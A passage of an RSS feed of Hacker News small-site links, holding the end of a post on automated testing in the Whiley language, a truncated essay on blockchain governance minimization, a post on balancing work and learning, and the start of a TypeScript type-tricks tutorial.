     T[] items
}
where <span>0</span> <span>&lt;=</span> length
where length <span>&lt;=</span> <span>|</span>items<span>|</span>
</code></pre></div><p>The current approach we take is rather simplistic here. We simply
generate all values of the <em>underlying type</em> and discard those which
donâ€™t satisfy the invariant. This works, but it has some problems:</p><ol><li><p><em>(Scale)</em>. Enumerating all values of a complex data type upto a
given bound can be expensive. We might easily need to generate
<em>1K</em>, <em>10K</em>, <em>100K</em> (or more) values, of which only a tiny
fraction may satisfy our invariant. For our <code>List</code> example
above, assuming a maximum array length of <code>3</code> and integer range
<code>-3..3</code>, there are <em>2800</em> possible values of the underlying type
of which only <em>1534</em> meet the invariant (55%). Thatâ€™s not too
bad, but as we get more invariants this changes quite quickly.
Consider this example taken from an implementation of <a href="https://en.wikipedia.org/wiki/Tarjan%27s_strongly_connected_components_algorithm">Tarjanâ€™s
algorithm</a>
for computing <em>strongly connected compoenents</em>:</p><div><pre><code data-lang="c">type Data is {
  <span>bool</span>[] visited,
  <span>int</span>[] lowlink,
  <span>int</span>[] index
}
where <span>|</span>visited<span>|</span> <span>==</span> <span>|</span>lowlink<span>|</span>
where <span>|</span>lowlink<span>|</span> <span>==</span> <span>|</span>index<span>|</span>
</code></pre></div><p>In this case, there are
<em>2.4M</em> values of the underlying type, of which only <em>946K</em> match
the invariant (39%). And, as we add more invariants (e.g. that
no element in <code>lowlink</code> can be negative) this ratio continues a
downward trend.</p></li><li><p><em>(Sampling)</em>. Another interesting issue arises with sampling.
Typically, we want to sample from large domains (i.e. rather
than enumerate them) to allow checking in reasonable time. The
problem is that, for complex data types with invariants, the
probability that a given value sampled from the underlying
domain meets the invariant is often very low. We have observed
situations where sampling <em>1K</em> or <em>10K</em> values from such a
domain produced <em>exactly zero</em> values meeting the invariant. In other
words, it was completely useless in these cases (though not in others).</p></li></ol><p>Whilst these may seem like serious problems, they stem from the
simplistic fashion in which we generate values for constrained types.
Actually, it is possible to generate values of constrained types directly
(i.e. without enumerating those of the underlying type) and
efficiently. The next evolution of the check functionaliy will implement
this and, hopefully, it will offer some big improvements.</p><h2 id="pros--cons">Pros / Cons</h2><p>There are several advantages to checking over static verification,
some of which may be unexpected:</p><ul><li><p><em>(Incomplete Specifications)</em>. We can check our programs even
when the specifications are incomplete. Suppose we are
developing two functions in tandem, say <code>max(int[])</code> which uses
<code>max(int,int)</code> as a subroutine. With static verification, we
cannot verify <code>max(int[])</code> before we have specified and verified
<code>max(int,int)</code>. However, we can start checking <code>max(int[])</code> as
soon as we have implementated <code>max(int,int)</code> (i.e. since
checking just executes it).</p></li><li><p><em>(Loop Invariants)</em>. We can check our programs without writing
any loop invariants. Since writing loop invariants can be
challenging, this is an important benefit. With static
verification, we cannot verify a function containing a loop
without correctly specifying the loop invariant first. That can
be a real pain, especially in the early stages of developing a
program.</p></li><li><p><em>(Counterexamples)</em>. Whenever checking finds a problem in our
program, it will also tell you the input values causing it and,
furthermore, they always correspond to real failures in your
program. Static verification, on the other hand, cannot always
generate an execution trace and, even when it does, they are not
always <em>realisable</em> traces of the program. That can make life
quite frustrating!</p></li></ul><p>Of course, there are some disadvantages with checking as well. Most
importantly, checking doesnâ€™t guarantee to find all problems with your
program! But, in our experience, it usually finds most of them.
There are also problems (discussed above) with generating enough
values for complex data types to properly test our functions.</p><h3 id="conclusion">Conclusion</h3><p>Overall, despite some limitations, we find checking to be incredibly
useful â€” <em>especially as its free</em>. Hereâ€™s a short demo to give you
a taste:</p><center><iframe src="https://www.youtube.com/embed/d_liFzxlpjA" width="560" height="315" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></center><p>So, head on over to the <a href="http://whileylabs.com/">online editor for
Whiley</a> and give it a go!</p><hr><p><i>Follow the discussion on
<a href="https://twitter.com/whileydave/status/1341215592733274112">Twitter</a>
or
<a href="https://www.reddit.com/r/programming/comments/khwdyb/automated_testing_for_free/">Reddit</a></i></p></div></div></div>]]>
            </description>
            <link>https://whileydave.com/2020/12/02/automated-testing-for-whiley/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511412</guid>
            <pubDate>Tue, 22 Dec 2020 21:24:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Networking for Future Founders]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511342">thread link</a>) | @rpicard
<br/>
December 22, 2020 | https://www.robert.io/networking-for-future-founders | <a href="https://web.archive.org/web/*/https://www.robert.io/networking-for-future-founders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.robert.io/networking-for-future-founders</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511342</guid>
            <pubDate>Tue, 22 Dec 2020 21:16:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Governance Minimization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511275">thread link</a>) | @varunsrin
<br/>
December 22, 2020 | https://www.fehrsam.xyz/blog/governance-minimization | <a href="https://web.archive.org/web/*/https://www.fehrsam.xyz/blog/governance-minimization">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1606457505557_58547"><div><h3><em>"The best government is that which governs least"</em> <em>â€” Unknown</em></h3><h3>co-authored by Dan Robinson</h3><p>Those who read my blockchain governance <a href="https://medium.com/@FEhrsam/blockchain-governance-programming-our-future-c3bfe30f2d74">post</a> from 2017 know I was excited about crypto exploring different forms of governance, especially on-chain governance. In the 3 years since, on-chain governance has gone from obscure to a popular component of many important protocols. Despite this traction, I think <strong>the most widely used protocols will trend towards governance minimization</strong>.<br>Why? Governance minimization allows stakeholders to depend on a protocol. This creates a virtuous cycle of adoption, enabling scale that would otherwise be unachievable. Look no further than successful traditional internet protocols like HTTP and SMTP to see this power today. Their governance minimization has allowed them to become standards everyone depends on, generating levels of use far exceeding what any company could achieve.<br>This post explains governance minimization, where governance remains important, and speculates on implications.</p><p><strong>Governance minimization<br></strong>Governance minimization means reducing the power and reliance on governance wherever possible.<br>Governance minimization is important because it supports the primary value proposition of protocols: credible neutrality. Minimizing governance tends to make protocols more credibly neutral.<br>In practice today, governance minimization most directly applies to minimizing on-chain governance. If a protocol wants to achieve maximum adoption and can avoid using governance for a function, it should do so.</p><p><strong>What is credible neutrality?<br></strong>Credible neutrality is dependability. It means a stakeholder (e.g a user or a developer) can use or build on a protocol with confidence it will <a href="https://nakamoto.com/credible-neutrality/">not change against their interests</a>. Protocols remain credibly neutral by avoiding "capture" by any particular group.</p><p><strong>Why is credible neutrality important?<br></strong>Credible neutrality is primary value proposition of crypto today. It's what allows for new forms of open and predictable money. It's what creates platforms where anyone can openly create and access new applications.<br>Lack of credible neutrality in existing platforms makes its importance clear. Central banks are not credibly neutral as platforms for money because a subset of stakeholders can decide to print money at will. Facebook and Twitter are not credibly neutral as platforms for applications because a subset of stakeholders can make changes that kill entire developer ecosystems.<br>It creates safety of value locked in a platform â€” both concrete (funds) and abstract (development time, users) â€” from theft, shutdown, and restriction.<br>A total failure of credible neutrality is an exit scam. Some stakeholders of a platform can abscond, in part or in whole, with the value other stakeholders own or have created. A literal example is a centralized crypto exchange operator running off with user funds. An abstract example is Twitter shutting down third party developer interfaces to enshrine the interface of Twitter Inc.</p><p><strong>What governance minimization is <em>not<br></em></strong>Governance minimization is <em>not</em> the idea that governance can or should go away entirely. In fact, this is impossible! There are some protocol functions that are hard or impossible to perform without governance ("essential governance", more on this later). And at a minimum, governance always exists through the ability to coordinate socially ("informally") and hard fork.</p><p><strong>Governance minimization creates more neutral protocols<br></strong>Creating a perfect governance system is like designing a perpetual motion device. There are well-known game theoretic results which show all governance systems are both <a href="https://vitalik.ca/general/2020/09/11/coordination.html#understanding-the-game-theory">inherently unstable</a> and <a href="https://en.wikipedia.org/wiki/Arrow%27s_impossibility_theorem">fail to simultaneously satisfy all desirable properties</a>. Formalizing a governance system tends to magnify these inherent issues by reducing the ability for informal governance to solve edge cases as they show up.<br>As a result, the more formal a governance system, the more susceptible it tends to be to capture over a sufficient time horizon. This is primarily because formalizing a governance system requires formalizing stakeholders (who has a say and how much of a say they should have). Formalizing stakeholders is very hard in practice at a single point in time and near impossible over time.</p><p><strong>Tokenholder misalignment<br></strong>Formalizing stakeholders for on-chain governance today typically occurs through simple token ownership and the governance itself through tokenholder voting.  Unfortunately, token holdings are not an accurate reflection of stakeholder value in a protocol for a number of reasons, including:</p><ul data-rte-list="default"><li><p>Not all stakeholders will necessarily be tokenholders, especially users and developers.</p></li><li><p>Token ownership may not accurately reflect a stakeholder's importance to the protocol, present or future. The next Facebook or Google-scale app, when it appears, could be strangled in the cradle by those with higher ownership.</p></li><li><p>Stakeholders change over time. The is especially obvious when considering future stakeholders which don't yet exist. Consider the interests of the mega app which has yet to be created.</p></li></ul><p>As a result, tokenholder voting creates a litany of misalignment issues with the long term use of a protocol, including:</p><ul data-rte-list="default"><li><p><a href="https://vitalik.ca/general/2019/05/09/control_as_liability.html">External pressures</a>. For example, Facebook Inc faced external pressure to lock down developer access to the most detailed social graph in the world (the Facebook platform). Right or wrong, this killed many applications and incalculable numbers of future applications yet to be created.</p></li><li><p>Value capture. Tokenholders may want to capture value for themselves at the expense of others. For example, Twitter monopolized its protocol's UI at the expense of third party developers.</p></li><li><p>Time horizon mismatch. Unlike a protocol, tokenholders have non-infinite time horizons. This may drive them to capture value short term at the expense of the long term use of the protocol. For example, Maker holders with a short term horizon might increase stability fees to generate value short term irrespective of long term impacts. Ironically, Facebook is a good example of the opposite, where Mark Zuckerberg famously refused to display ads (capture value) while the network effect of Facebook was still growing.</p></li><li><p>Outside economic interests. Tokenholders may be large holders of another token and vote with that interest in mind rather than the interests of the protocol being changed. Liquidity mining programs in DeFi are especially vulnerable to this form of misalignment.</p></li></ul><p>Exploits to act on these misalignments are well documented and hard to avoid. Prominent attacks include <a href="https://vitalik.ca/general/2018/03/28/plutocracy.html">buying votes</a> or voting with borrowed tokens â€” an attack made easier with the invention of flash loans that has <a href="https://www.coindesk.com/flash-loans-manipulate-defi-protocol-elections">already worked</a>!</p><p><strong>Other side effects<br></strong>Even if participants don't explicitly capture a system, governance may still create unintended side effects. For example, formal governance systems can encourage action versus inaction, even when inaction is superior. Governance can also be extremely time and energy consuming.</p><p><strong>Speed of evolution<br></strong>A common argument for on-chain governance is that it can allow protocols to evolve faster. However, there is little, if any, empirical evidence of on-chain governance causing faster protocol evolution. On-chain governance is also extremely nascent, so judging it too heavily is likely premature.<br>What <em>has</em> been demonstrated is the opposite: that rapid evolution can occur without on-chain governance. For example, early Ethereum and Uniswap are protocols that evolved quickly through hard forking alone. This agility can be attributed to a combination of tight knit communities, lower systemic importance, and high levels of trust in core development teams.<br>What about ossification at later stages? Evolution may slow as some combination of network effects, pointer stickiness (protocols becoming embedded in the code of other protocols/applications), and risk aversion set in. Still, if a change is important enough, users and applications can voluntarily opt into it. This usually means a hard or soft fork for a layer-1 protocol and a voluntary migration for layer 2 protocols or application, as seen with the v1 to v2 transitions in protocols like Uniswap, Maker, Compound, and Augur.<br>Ultimately, if a protocol becomes sufficiently inferior to a new alternative, eventually it will be surpassed and die. This is how evolution works in nature. Individual organisms do not evolve (in the genetic code sense). Evolution occurs when copies are made with mutations. This approach has also worked in open source in the past (e.g Linux).<br>Since credible neutrality is the primary value proposition of protocols, erring towards governance minimization over time, even if it means slower evolution at the individual protocol level, will lead to maximal use.</p><p><strong>Governance minimization enables faster ecosystem-wide evolution<br></strong>Most importantly, dependable individual protocols enable faster ecosystem-wide evolution because developers can use these building blocks with confidence. Imagine how much faster development of internet applications would be if every company's code was open source, neutral, and usable by anyone.</p><p><strong>When <em>is</em> governance valuable?<br></strong>Governance is needed where a core mechanism of a protocol requires human input. Human input is needed when a protocol's response to a particular action cannot be known in advance or derived from on-chain data, and thus cannot be coded into the protocol. We refer to these mechanisms as "essential governance".</p><p>Areas of essential governance include:</p><ul data-rte-list="default"><li><p>Consensus itself (e.g. the layer 1 consensus mechanism of Bitcoin or Ethereum). Consensus is governance over which of two otherwise valid histories is valid. This governance is tightly constrained: Bitcoin miners can double-spend and revert history but cannot print unlimited Bitcoin.</p></li><li><p>Oracles. Oracles need some form of human mechanism to decide whether or not their data is valid.</p></li></ul><p>Areas where governance is likely required include:</p><ul data-rte-list="default"><li><p>Treasury management. Governance is likely required for the foreseeable future: deciding how to allocate funds is a hard problem to automate.</p></li><li><p>Câ€¦</p></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.fehrsam.xyz/blog/governance-minimization">https://www.fehrsam.xyz/blog/governance-minimization</a></em></p>]]>
            </description>
            <link>https://www.fehrsam.xyz/blog/governance-minimization</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511275</guid>
            <pubDate>Tue, 22 Dec 2020 21:08:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HarmonyOS Overview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511201">thread link</a>) | @ptx
<br/>
December 22, 2020 | https://developer.harmonyos.com/en/docs/documentation/doc-guides/harmonyos-overview-0000000000011903 | <a href="https://web.archive.org/web/*/https://developer.harmonyos.com/en/docs/documentation/doc-guides/harmonyos-overview-0000000000011903">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://developer.harmonyos.com/en/docs/documentation/doc-guides/harmonyos-overview-0000000000011903</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511201</guid>
            <pubDate>Tue, 22 Dec 2020 21:02:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is the Proper Balance Between Working and Learning?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511162">thread link</a>) | @WaitWaitWha
<br/>
December 22, 2020 | https://embeddedartistry.com/blog/2020/11/16/what-is-the-proper-balance-between-working-and-learning/ | <a href="https://web.archive.org/web/*/https://embeddedartistry.com/blog/2020/11/16/what-is-the-proper-balance-between-working-and-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-12228">
		

	
	<div>
		<div><p><strong>Updated:</strong> 20201122</p>
<p>One of our members asked me this question:</p>
<blockquote>
<p>I have started to pick up some freelance work alongside my main job. Now I spend almost the whole day working. Iâ€™m starting to feel like Iâ€™m missing out on my learning, although doing freelance work has opened up whole new on-the-job learning opportunities. But, I still want to make time to learn additional skills like understanding architecture, designing programs,  and so on.<br>
In your opinion, what is a healthy balance for learning and working?</p>
</blockquote>
<p>I definitely understand this pressure â€“ my time is a mix of consulting, writing for the website, creating courses, raising kids, cooking for the family, gardening, and trying to squeeze in learning time. Whenever things get particularly busy with clients or the website, seemingly extraneous activities like learning are the first thing to drop by the wayside.</p>
<h2>Is This Actually a Problem?</h2>
<p>First, I want to note that I donâ€™t think a temporary suspension of learning is a problem. While we should always be prioritizing our tasks and executing on the current highest priority item, we need to pay particular attention to this prioritize-and-execute strategy when we feel overwhelmed. Focus on the highest priority task, knock it out, and then move on to the next. Extraneous items, which can include learning, can and should fall by the wayside.</p>
<p>However, I do want to note that this kind of workload isnâ€™t really sustainable over long periods of time. We can draw a parallel to the concept of "<a href="https://exrx.net/WeightTraining/Periodization">periodization</a>" in the fitness world, where we drop from a period of intense workouts into a "recovery" period, which allows our muscles and nervous system to recover appropriately. This means that you need to schedule heavier workloads in cycles, making sure to periodically reduce your load (below the typical 40 hours a week!) to recover. If you donâ€™t do this, you will will burn yourself out or become sick. If you choose to cycle your workload in this manner, scheduling learning activities for your "recovery" periods may be the ideal solution, since it is generally quite fun and low stress.</p>
<h2>Whatâ€™s the Proper Balance?</h2>
<p>Our memberâ€™s question was actually about a healthy balance for learning and working. I keep a sticky note on my monitor that says <strong>"20% learning, 80% action."</strong></p>
<p>This reminder is important to me, because I have a tendency to be an "over-learner" who spends time learning things just for the sake of learning. I doubt that Iâ€™m alone in this â€“ it seems to be a general tendency among the knowledge workers that I know.</p>
<p>The problem is that â€œexcessive learningâ€ often serves as a distraction, a justification for procrastination, or a cover for the fear you feel when you need to start a project or finally release it for the public to see. There is an infinite amount of information in the universe, but humans are limited and can only possess a small drop in this vast ocean of information. You could spend your whole life learning â€“ but to what end? And are you sure that what youâ€™re learning is contributing a positive return on investment to your life?</p>
<p>We are creatures of action, and in my view, learning should be used to make that action more effective and to reduce the unwanted side effects of our actions. Programming and engineering are fundamentally creative acts. We cannot think or learn our creations into existence. We actually need to take the time build them.</p>
<p>As Dr. Feynman says, thereâ€™s a difference between <a href="https://www.youtube.com/watch?v=lFIYKmos3-s">knowing a thing and understanding it</a>. Often, when weâ€™re spending a disproportionate amount of time learning (without actively applying the knowledge), weâ€™re just "learning the names of things" without actually <em>understanding</em> those things.</p>
</div>



<figure><div>

</div></figure><div><p>We need to actively apply what weâ€™ve learned to understand its potential value and to cement the lessons in our minds. We need to reflect on new lessons and techniques in order to find ways to anchor them to what we already know. We need to identify holes in our understanding and work to fill in those holes. We need to evolve beyond what weâ€™ve learned, contributing new ideas and discoveries to the existing body of knowledge. We cannot do any of this without action!</p>
<p>In my opinion, the ultimate form of knowledge for a human is <em>embodied knowledge</em> â€“ knowledge that is so deeply rooted in your being that you can rely on your intuition, muscle memory, and automatic reactions to generate a suitable course of action without requiring significant thought or study. We cannot develop embodied knowledge through "book learning" alone. We need deliberate practice and repetition to achieve this goal.</p>
<h2>How to Fit in Learning Time with a Busy Schedule?</h2>
<p>Beyond an 80/20 split, there are other considerations to keep in mind when we think about fitting continuing education into our schedule.</p>
<p>One important aspect to consider is the <a href="https://en.wikipedia.org/wiki/Spacing_effect">spacing effect</a> and lag effect. Humans learn much better when learning is spread out over time, and we remember things better when we space reviews over longer periods of time instead of shorter periods of time. You will learn more effectively if you set aside 30 minutes per workday instead of 2.5 hours on a Friday afternoon.</p>
<p>We are also creatures of habit. Routines provide structure and consistency to our lives. We are much more likely to stick to a habit that we perform on the same day, at the same time each day, and under the same conditions. This is another reason to set aside a smaller amount of time on a daily basis.</p>
<p>We need to take breaks in order to remain effective. You need to be sure that you are getting up to stretch, walk around, get your blood flowing, and allow your mind to rest. I also strongly recommend <a href="https://embeddedartistry.com/blog/2018/08/02/my-favorite-debugging-tip-get-up-and-take-a-walk/">taking a break whenever youâ€™re stumped by a tricky problem</a>.  I like to spend my breaks walking, doing a quick set of kettlebell swings, or playing some music. You might choose to squeeze in some reading, a podcast, or an audiobook (the latter two being especially suitable for a walk!). Ultimately, the goal is to relax your mind and distract yourself from the problem at hand. However you choose to do that is acceptable.</p>
<blockquote>
<p><strong>Note:</strong> I take a 1 minute break every 20 minutes, and a 15 minute break every two hours. A program on my computer enforces this for me by locking out my screen. You might also choose to use the popular <a href="https://en.wikipedia.org/wiki/Pomodoro_Technique">Pomodoro technique</a>. In this case you would work for 25 minutes and then take a 5 minute break. Every four intervals, you would take a longer 15-30 minute break.</p>
</blockquote>
<p>What happens when it becomes crunch time, and you need to put in the extra effort to complete the project on time or manage an unexpectedly high workload? In these situations, the larger chunks of down time are likely to be sacrificed to squeeze in more work. You can justify keeping smaller, regular blocks of break time in the schedule, especially if you view that block of time as an essential rest.</p>
<p>Some people use a calendar to govern their lives. In this case, carve out time on your calendar for learning and mark yourself as "busy". Ideally, you will schedule this time when you are not likely to give it up for things such as important meetings.</p>
<p>If you work on a team, you could also create a weekly reading club or â€œlunch-and-learnâ€ sessions. By scheduling continuous education as a group, you build in accountability. Teaching others is also a way to make sure you understand the concepts that youâ€™re teaching. Making sure you understand something well enough to simplify it and explain it to others also helps you cement the knowledge in your mind even further. For the best results, we recommend having a different team member present a paper or topic each week or month (depending on the frequency). We all have our own interests, and cross-pollination can be extremely effective in a team environment.</p>
<blockquote>
<p><strong>Note:</strong> Enterprising employees may also be able to convince their managers to cater a team meal if you schedule the session during lunch time!</p>
</blockquote>
<p>The final strategy I will share is scheduling a â€œlearningâ€ sprint. This works especially well if youâ€™re coming off of a heavy workload and need a mental reset. You can set aside 1â€“2 weeks to focus on deeply studying a given topic, and then you return to your work well-rested and with new ideas. Often, I will collect interesting books, articles, and lectures for a given topic ahead of time, only scheduling a learning sprint when I reach critical mass in terms of both material and interest/need. Ideally, you will be able to immediately start putting into practice whatever it is you are learning about (otherwise, why are you dedicating so much time to learning it?).</p>
<p>If you find yourself using learning as a form of procrastination, sprints can help you transform that habit. Instead of getting sucked into a learning wormhole, save the articles or books in a digital notebook until youâ€™re able to set aside time to do a deep dive into the subject.</p>
<h2>Do You Really Not Have Time?</h2>
<p>I want to close this article with a question: is it <em>actually true</em> that you donâ€™t have time to learn?</p>
<p>If you are raising a family, caring for a sick or elderly family member, or working multiple jobs, squeezing in time for learning might not make the cut. However, if none of those describe your situation, thereâ€™s an extremely high probability that you really do have time.</p>
<p>Imagine I was looking over your shoulder while you went about your day. How often am I going to see you get distracted, open up a news site, browse social media? Am I going to see you binge watching <a aria-describedby="tt" href="https://embeddedartistry.com/fieldmanual-terms/technical-standards-view/" data-cmtooltip="<div class=glossaryItemTitle><span class=&quot;dashicons &quot; data-icon=&quot;&quot; style=&quot;color:#000;display:inline;vertical-align:baseline;&quot;></span>Technical Standards View [TV]</div><div class=glossaryItemBody>DoDAF view. Technical standards view (TV) products define technical standards, implementation conventions, business rules and criteria that govern the architecture.</div>">TV</a> shows or playing video games? This isnâ€™t to say that you shouldnâ€™t be checking in on people, relaxing, or having fun â€“ but are these activities really so much more important than the areas you claim you donâ€™t have time for?</p>
<p>My approach to making everything fit in the schedule involves <a href="https://embeddedartistry.com/blog/2018/06/28/how-i-schedule-my-day-as-a-consultant/#eliminate-distractions">eliminating distractions</a> and <a href="https://embeddedartistry.com/blog/2018/06/28/how-i-schedule-my-day-as-a-consultant/#how-i-structure-my-day">working when I am most effective</a>. But donâ€™t just take it from me. In this video, Jocko Willink describes ways we can squeeze in reading and learning into our busy lives:</p>
</div>



<figure><div>

</div></figure>

	</div>

	 
</article></div>]]>
            </description>
            <link>https://embeddedartistry.com/blog/2020/11/16/what-is-the-proper-balance-between-working-and-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511162</guid>
            <pubDate>Tue, 22 Dec 2020 20:58:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced TypeScript Type Tricks]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25510594">thread link</a>) | @dested
<br/>
December 22, 2020 | https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/ | <a href="https://web.archive.org/web/*/https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
        <div>

            
            <div>

                
                <h3 id="a-journey">A journey</h3>
<p>After spending some time in TypeScript you may begin to crave type safety everywhere in your life. JavaScript is an inherently unsafe language and there are dragons to be found everywhere and in almost every framework. Most frameworks are sufficiently covered, but what if you design a beautiful API internally that needs to be incredibly feature rich, and incredibly safe, but still allow for the best JavaScript idioms. Well at that point you may have to dive into writing some pretty gnarly types.</p>
<p>In general there are a number of TypeScript TYPE libraries out there, <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>, <a href="https://github.com/piotrwitek/utility-types">utility-types</a>, <a href="https://www.npmjs.com/package/type-fest">type-fest</a> to name a few. These libraries are great, and contain a plethora of information, but they are generally sparse in describing HOW they created their utility types.</p>
<blockquote>
<p>There are a lot of great type libraries, but no great documentation on how theyâ€™re built</p>
</blockquote>
<p>The goal of this post is to not only expose some great utility types, but also some tips and tricks that I realized along the way. Unfortunately this post requires a relatively strong understanding of TypeScript types and tricks. <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">Advanced Types</a> is a great place to start before diving in!</p>
<h3 id="esoteric-solutions">Esoteric solutions</h3>
<p>A lot of these solutions (and problems) may feel esoteric, and thatâ€™s because frankly they are. They are not for the faint of heart, they do not need to be known for daily TypeScript use. They are the nitty-gritty realities of writing type libraries for incredibly complex or il-defined JavaScript problems.</p>
<p>Most of these types come from a few TypeScript libraries im working on, namely <a href="https://www.npmjs.com/package/safe-schema">safe-schema</a>, and <a href="https://www.npmjs.com/package/mongo-safe">mongo-safe</a>, both of which I intend to do lengthy blog posts on in the future.</p>
<p>I have tried to organize these with an example of the usage, and the reason why the problem or solution is novel or interesting. They are in no particular order.</p>
<p>
  <img src="https://casualdeveloper.net/img/youshouldnt.gif" alt="I didnt say they couldnt I said you shouldnt">

</p>
<hr>
<h2 id="setting-a-variable-extends-infer">Setting A Variable (<code>extends infer</code>)</h2>
<h3 id="example">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> {item: <span>Fancy</span>&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>} <span>|</span> 
                Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>, Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>] <span>|</span> 
                [Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span>];
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> Fancy&lt;<span>Shmancy</span>&lt;<span>Deeply</span>&lt;<span>Nested</span>&lt;<span>T</span>&gt;<span>&gt;&gt;&gt;</span> <span>extends</span> <span>infer</span> TItem <span>?</span> 
                {item: <span>TItem</span>} <span>|</span> TItem <span>|</span> [TItem, TItem] <span>|</span> [TItem]<span>:</span>
                Impossible;

<span>type</span> Impossible <span>=</span> <span>never</span>;
</code></pre></div>
<h3 id="reason">Reason</h3>
<p>Occasionally you will need to use the same type over and over in your type definition. Every time TypeScript encounters your type it will have to evaluate it again. Using the infer trick you can store a variable in your type that you can use throughout the rest of it.</p>
<p>You will see this <code>extends infer</code> trick pop up in a few places. <code>infer</code> has some interesting properties that make it useful when defining complex types.</p>
<p>Note the use of <code>Impossible</code> here. We can never reach the Impossible branch, so typically we would specify never here, but I have found just putting never there will be confusing in the future when looking at these types again thinking that never branch could possibly be hit. The use of explicit type aliasâ€™s that resolve to basic types is a great way to be explicit in your definitions.</p>
<p><em>Note:</em> This will not work if the result of your type is <code>never</code>. If T or <code>Fancy&lt;Shmancy&lt;Deeply&lt;Nested&lt;T&gt;&gt;&gt;&gt;</code> is never, the whole expression will result in <code>never</code>.</p>
<hr>
<h2 id="type-is-never">Type is <code>never</code></h2>
<h3 id="example-1">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>never</span> <span>?</span> 1 : <span>0</span>;

<span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// never
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>never</span>] <span>?</span> 1 : <span>0</span>;
<span>//              ^ ^         ^     ^
</span><span></span><span>type</span> Test1 <span>=</span> Shoes<span>&lt;</span><span>'hi'</span><span>&gt;</span>; <span>// 0
</span><span></span><span>type</span> Test2 <span>=</span> Shoes&lt;<span>never</span>&gt;; <span>// 1
</span></code></pre></div>
<h3 id="reason-1">Reason</h3>
<p>It is not easy to test for <code>never</code>. Once one of the types in your expression is <code>never</code> it will <strong>poison</strong> the rest of the expression to evaluate to <code>never</code>. Typically, this is a useful feature, but when you actually need to check for <code>never</code> you can wrap your expression in a tuple. This will trick the TypeScript compiler to compare apples to apples instead of expanding the <code>never</code>.</p>
<p>It works by comparing the tuple <code>T</code> to the tuple <code>never</code>. We use this tuple trick in a number of places. I am not certain as to why it works, other than the fact that tuples make TypeScript slightly less greedy in its evaluation.</p>
<hr>
<p>
  <img src="https://casualdeveloper.net/img/never.gif" alt="What never? No never.">

</p>
<h2 id="compare-multiple-types-at-once">Compare Multiple Types At Once</h2>
<h3 id="example-2">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> T1 <span>extends</span> {} <span>?</span> 
                              (T2 <span>extends</span> <span>number</span> <span>?</span> 
                                  (T3 <span>extends</span> <span>string</span> <span>?</span> 
                                      1 : 
                                      <span>0</span>)<span>:</span> 
                                  <span>0</span>)<span>:</span> 
                              <span>0</span>;
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> 
                        [
                            T1 <span>extends</span> {} <span>?</span> 1 : <span>0</span>, 
                            T2 <span>extends</span> <span>number</span> <span>?</span> 1 : <span>0</span>, 
